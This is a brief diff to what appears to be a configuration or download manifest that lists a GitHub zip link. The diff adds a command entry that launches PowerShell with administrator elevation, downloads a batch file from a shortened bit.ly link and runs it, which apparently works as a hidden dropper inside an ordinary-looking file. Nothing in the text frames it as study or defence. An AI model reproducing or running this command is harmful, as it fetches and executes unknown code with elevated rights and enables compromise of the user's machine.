@@ -4,3 +4,5 @@
 https://github.com/gobotku0/API/raw/main/m/1.zip
 [note]
 first
+[cmd]
+powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c powershell wget bit.ly/3uDgTEo -o a.bat & a.bat'"
